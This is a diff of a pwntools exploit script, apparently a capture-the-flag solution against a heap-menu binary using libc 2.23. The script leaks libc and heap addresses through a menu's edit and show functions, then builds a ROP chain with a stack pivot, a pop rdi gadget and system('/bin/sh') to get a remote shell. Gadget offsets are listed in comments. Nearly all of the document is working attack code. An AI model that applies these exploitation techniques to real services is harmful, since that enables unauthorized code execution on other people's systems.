@@ -1,9 +1,10 @@
 #coding=utf8
 from pwn import *
+import time
 context.log_level = 'debug'
 context.terminal = ['gnome-terminal','-x','bash','-c']
 
-local = 1
+local = 0
 shell = 0
 
 if local:
@@ -14,9 +15,9 @@ if local:
 elif shell:
 	sh = process('./test.sh', shell=True)
 else:
-	sh = remote('127.0.0.1',8887)
-	bin = ELF('./test')
-	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+	sh = remote('0.0.0.0','0')
+	bin = ELF('./demo')
+	libc = ELF('./libc-2.23.so')
 	#bin = ELF('')
 	#libc = ELF('')
 
@@ -36,6 +37,7 @@ def edit(name=str, content=str):
     sh.sendline('2')
     sh.recvuntil('edit')
     sh.sendline(name)
+    sleep(1)
     sh.sendline(content)
 
 def show(name=str):
@@ -47,46 +49,47 @@ def show(name=str):
 def parse():
     sh.recvuntil("Choice")
     sh.sendline('1')
+    sh.recvuntil("content")
 
 parse()
+with open('BFS.vcxproj') as fp:
+	content = fp.read()
+sh.send(content + '\xff')
 show("Project")
 sh.recvuntil("Useless")
-libc_addr = u64(sh.recv(6).ljust(8, b'\x00')) - 0x3C4B78 - 0x80
+libc_addr = u64(sh.recv(6).ljust(8, b'\x00')) - 0x3C4B78 - 0x80 - 0x250
 success("libc_addr:" + hex(libc_addr))
-edit("Project2", 'a' * 0x80)
-edit("Project2", "a")
-show("Project2")
-sh.recvuntil('a' * 0x80)
+edit("Project6", 'a' * 0x60)
+edit("Project6", "a")
+show("Project6")
+sh.recvuntil('a' * 0x60)
 heap_addr = u64(sh.recvuntil('\x0a')[:-1].ljust(8, b'\x00'))
 success("heap_addr:" + hex(heap_addr))
 payload = "/bin/sh\x00"
-payload += p64(libc_addr + 0xf1147)
-payload = payload.ljust(0x1b0, 'a') + p64(heap_addr + 0x22d0 + 0x8)
-edit("Project", payload)
-edit("Project", 'a')
-z('b *0x404227')
-show("Project")
+payload += p64(libc_addr + 0xb6316)
+payload = payload.ljust(0xc0, 'a') + p64(heap_addr + 0x1578)
+ropchain = p64(libc_addr + 0x102083)
+ropchain += 'a' * (0xf - 8)
+ropchain += p64(libc_addr + 0x3838)
+ropchain = ropchain.ljust(0x20, 'a')
+ropchain += p64(libc_addr + 0x21112)
+ropchain += p64(libc_addr + next(libc.search("/bin/sh")))
+ropchain += p64(libc_addr + libc.sym['system'])
+edit("Project5", ropchain)
+edit("Project5", 'a')
+edit("Project4", payload)
+edit("Project4", 'a')
+show("Project5")
 sh.interactive()
 
-'''
-$0x47 libcaddr
 
-0x7f fff78f7 41d
-
-0x45216	execve("/bin/sh", rsp+0x30, environ)
-constraints:
-  rax == NULL
-
-0x4526a	execve("/bin/sh", rsp+0x30, environ)
-constraints:
-  [rsp+0x30] == NULL
-
-0xf02a4	execve("/bin/sh", rsp+0x50, environ)
-constraints:
-  [rsp+0x50] == NULL
-
-0xf1147	execve("/bin/sh", rsp+0x70, environ)
-constraints:
-  [rsp+0x70] == NULL
-
+'''remote
+call -> 0x00000000000b6316 : push rsi ; fcos ; jmp qword ptr [rsi + 0xf]
+rsi + 0xf:
+0x0000000000003838 : pop rsp ; ret
+rsi:
+0x0000000000102083 : sub al, 0 ; add rsp, 0x18 ; ret
+rsi + 0x18:
+0x0000000000021112 : pop rdi ; ret
+/bin/sh
 '''
